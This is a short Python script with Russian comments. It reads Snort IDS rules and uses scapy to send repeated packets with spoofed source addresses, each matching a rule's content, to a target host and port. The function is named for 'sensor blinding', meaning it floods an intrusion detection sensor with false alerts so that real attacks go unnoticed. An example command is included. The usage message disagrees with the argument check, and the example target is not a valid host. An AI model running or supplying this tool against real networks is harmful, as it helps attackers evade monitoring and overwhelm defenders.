import sys
from parser import parse_snort_rules
from scapy.all import *

def send_sensor_blinding_packets(rules_file, protocol, target_host, target_port, num_packets):
    
    # Парсинг правил
    parsed_rules = parse_snort_rules(rules_file, protocol, target_host, target_port)

    # Формирование и отправка пакетов
    for rule in parsed_rules:

        # Формирование TCP пакета
        if rule["protocol"] == "tcp":
            pkt = IP(dst=target_host, src=rule["source_address"])/TCP(dport=target_port, sport=int(rule["source_port"]))/Raw(load=rule["content"])

        # Формирование UDP пакета
        elif rule["protocol"] == "udp":
            pkt = IP(dst=target_host, src=rule["source_address"])/UDP(dport=target_port, sport=int(rule["source_port"]))/Raw(load=rule["content"])

        # Отправка пакетов
        for _ in range(num_packets):
            send(pkt, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python script.py <rules_file> <target_host> <target_port> <num_packets>")
        sys.exit(1)

    rules_file = sys.argv[1]
    protocol = sys.argv[2]
    target_host = sys.argv[3]
    target_port = int(sys.argv[4])
    num_packets = int(sys.argv[5])

    send_sensor_blinding_packets(rules_file, protocol, target_host, target_port, num_packets)


# Пример использования
# python3 main3.py community.rules tcp '$EXTERNAL_NET' 22 1